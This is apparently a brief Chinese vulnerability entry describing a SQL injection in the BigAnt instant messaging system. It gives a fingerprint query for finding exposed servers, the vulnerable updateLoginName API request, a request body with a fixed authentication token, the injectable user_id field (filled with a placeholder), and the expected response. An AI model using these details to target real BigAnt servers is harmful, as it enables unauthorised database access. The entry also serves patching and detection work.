# 大蚂蚁(BigAnt)即时通讯系统updateLoginName存在SQL注入漏洞

大蚂蚁(BigAnt)即时通讯系统 ｜ SQL注入 ｜ —
- **指纹**：`product="即时通讯系统"`
- **请求**：`POST /api/user/updateLoginName HTTP/1.1`

**Payload**
```
authen=cc7e6a614831d1c6b351a5f12678ed4b94cf98b2a52b1050d6c19433fdeff37d&uid=1&user_login=1&user_id=SQLI_POC
```
- **响应特征**：200